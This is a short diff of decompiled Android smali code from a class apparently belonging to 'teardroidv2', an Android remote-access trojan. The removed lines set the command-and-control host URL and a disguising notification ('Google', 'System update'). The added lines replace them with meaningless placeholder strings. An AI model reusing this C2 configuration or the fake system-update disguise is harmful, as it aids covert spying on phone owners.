@@ -127,22 +127,22 @@
     .line 11
     sput-object v0, Lcom/example/teardroidv2/AppInfo;->devHostName:Ljava/lang/String;
 
-    const-string v0, "https://xenbdi.deta.dev"
+    const-string v0, "fghfdgh"
 
     .line 12
     sput-object v0, Lcom/example/teardroidv2/AppInfo;->HOSTNAME:Ljava/lang/String;
 
-    const-string v0, "Google"
+    const-string v0, "fghd"
 
     .line 13
     sput-object v0, Lcom/example/teardroidv2/AppInfo;->NotificationTitle:Ljava/lang/String;
 
-    const-string v0, "System update"
+    const-string v0, "fghdfghdfg"
 
     .line 14
     sput-object v0, Lcom/example/teardroidv2/AppInfo;->NotificationContent:Ljava/lang/String;
 
-    const-string v0, "hacksec"
+    const-string v0, "hdfgh"
 
     .line 15
     sput-object v0, Lcom/example/teardroidv2/AppInfo;->NotificationSubText:Ljava/lang/String;
